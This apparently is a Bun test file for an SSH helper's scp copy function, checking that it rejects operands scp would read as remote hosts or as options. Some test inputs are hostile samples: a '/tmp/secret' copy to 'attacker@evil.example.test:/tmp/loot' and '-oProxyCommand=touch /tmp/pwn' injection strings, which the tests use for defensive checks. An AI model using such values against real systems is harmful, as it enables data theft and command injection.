import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from 'bun:test';
import fs from 'fs';
import os from 'os';
import path from 'path';
import type { Connection } from '../database';
import { copyLocalOperandProblem, executeCopy, looksLikeRemoteCopyOperand } from './copy';

const connection: Connection = {
  id: 1,
  alias: 'web',
  user: 'tester',
  host: 'allowed.example.test',
  port: '22',
};

let tempDir: string;
let counter = 0;
let previousScpBin: string | undefined;
let previousReuse: string | undefined;

const writeScript = (name: string, body: string): string => {
  counter += 1;
  const file = path.join(tempDir, `${counter}-${name}`);
  fs.writeFileSync(file, `#!/bin/sh\n${body}\n`, { mode: 0o755 });
  return file;
};

beforeAll(() => {
  tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sshya-copy-test-'));
});

afterAll(() => {
  fs.rmSync(tempDir, { recursive: true, force: true });
});

beforeEach(() => {
  previousScpBin = process.env.SSHYA_SCP_BIN;
  previousReuse = process.env.SSHYA_REUSE;
  process.env.SSHYA_REUSE = '0';
});

afterEach(() => {
  if (previousScpBin === undefined) {
    delete process.env.SSHYA_SCP_BIN;
  } else {
    process.env.SSHYA_SCP_BIN = previousScpBin;
  }
  if (previousReuse === undefined) {
    delete process.env.SSHYA_REUSE;
  } else {
    process.env.SSHYA_REUSE = previousReuse;
  }
});

describe('copy operand validation', () => {
  test('detects the operands scp would treat as remote', () => {
    expect(looksLikeRemoteCopyOperand('user@host:/tmp/x')).toBe(true);
    expect(looksLikeRemoteCopyOperand('host:path')).toBe(true);
    expect(looksLikeRemoteCopyOperand('a:b')).toBe(true);
    expect(looksLikeRemoteCopyOperand('/tmp/a:b')).toBe(false);
    expect(looksLikeRemoteCopyOperand('dir/a:b')).toBe(false);
    expect(looksLikeRemoteCopyOperand('./a:b')).toBe(false);
    expect(looksLikeRemoteCopyOperand('plain.txt')).toBe(false);
    expect(looksLikeRemoteCopyOperand(':relative')).toBe(false);
  });

  test('rejects leading dashes so scp cannot parse a path as an option', () => {
    expect(copyLocalOperandProblem('-oProxyCommand=x', 'source')).toContain('cannot start with "-"');
    expect(copyLocalOperandProblem('--', 'destination')).toContain('cannot start with "-"');
    expect(copyLocalOperandProblem('/tmp/file', 'source')).toBeUndefined();
  });
});

describe('executeCopy', () => {
  test('refuses a download destination that scp would treat as another host', async () => {
    const marker = path.join(tempDir, 'scp-download-marker');
    process.env.SSHYA_SCP_BIN = writeScript('scp-marker.sh', `printf ran > '${marker}'`);

    const result = await executeCopy(connection, '/tmp/secret', 'attacker@evil.example.test:/tmp/loot', {
      download: true,
    });

    expect(result.ok).toBe(false);
    expect(result.errorKind).toBe('invalid-path');
    expect(result.stderr).toContain('remote scp target');
    expect(fs.existsSync(marker)).toBe(false);
  });

  test('refuses an upload source that scp would treat as another host', async () => {
    const marker = path.join(tempDir, 'scp-upload-marker');
    process.env.SSHYA_SCP_BIN = writeScript('scp-marker.sh', `printf ran > '${marker}'`);

    const result = await executeCopy(connection, 'other.example.test:/tmp/secret', '/tmp/local', {});

    expect(result.ok).toBe(false);
    expect(result.errorKind).toBe('invalid-path');
    expect(fs.existsSync(marker)).toBe(false);
  });

  test('refuses a local operand that starts with a dash', async () => {
    const marker = path.join(tempDir, 'scp-dash-marker');
    process.env.SSHYA_SCP_BIN = writeScript('scp-marker.sh', `printf ran > '${marker}'`);

    const result = await executeCopy(connection, '-oProxyCommand=touch /tmp/pwn', '/tmp/local', {});

    expect(result.ok).toBe(false);
    expect(result.errorKind).toBe('invalid-path');
    expect(fs.existsSync(marker)).toBe(false);
  });

  test('expands ~ in a local download destination before spawning scp', async () => {
    const argsFile = path.join(tempDir, 'scp-args.txt');
    process.env.SSHYA_SCP_BIN = writeScript('scp-record.sh', `printf '%s\\n' "$@" > '${argsFile}'`);

    const result = await executeCopy(connection, '/tmp/secret', '~/backups', { download: true });

    expect(result.ok).toBe(true);
    const args = fs.readFileSync(argsFile, 'utf8').trim().split('\n');
    expect(args.at(-2)).toBe('tester@allowed.example.test:/tmp/secret');
    expect(args.at(-1)).toBe(path.join(os.homedir(), 'backups'));
  });

  test('clamps a timeout above the setTimeout limit instead of aborting after 1 ms', async () => {
    process.env.SSHYA_SCP_BIN = writeScript('scp-slow.sh', 'sleep 0.2; exit 0');

    const result = await executeCopy(connection, '/tmp/local', '/tmp/remote', {
      timeoutMs: 1_000_000_000_000,
    });

    expect(result.ok).toBe(true);
    expect(result.timedOut).toBe(false);
  });
});
